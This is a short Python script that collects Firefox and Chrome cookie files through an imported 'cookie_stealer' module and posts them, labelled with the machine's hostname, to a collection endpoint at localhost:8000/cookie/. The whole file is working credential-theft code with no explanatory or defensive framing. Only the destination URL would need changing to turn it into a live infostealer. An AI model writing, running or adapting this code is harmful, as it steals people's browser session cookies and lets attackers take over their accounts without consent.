import socket

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

import cookie_stealer


hostname = socket.gethostname()
if not hostname:
    hostname = socket.getfqdn()

# Get firefox cookies
firefox_cookies = cookie_stealer.firefox()
firefox_cookie_path = firefox_cookies.run()

# Get chrome cookies
chrome_cookies = cookie_stealer.chrome()
chrome_cookie_path = chrome_cookies.run()

payload = MultipartEncoder(
    fields={'browser': 'firefox', 'name': hostname,
            'chrome_cookie': ('%s_chrome_cookie' % hostname, open(chrome_cookie_path, 'rb'), 'text/plain',),
            'firefox_cookie': ('%s_firefox_cookie' % hostname, open(firefox_cookie_path, 'rb'), 'text/plain',)}
)

r = requests.post('http://localhost:8000/cookie/', data=payload,
                  headers={'Content-Type': payload.content_type})
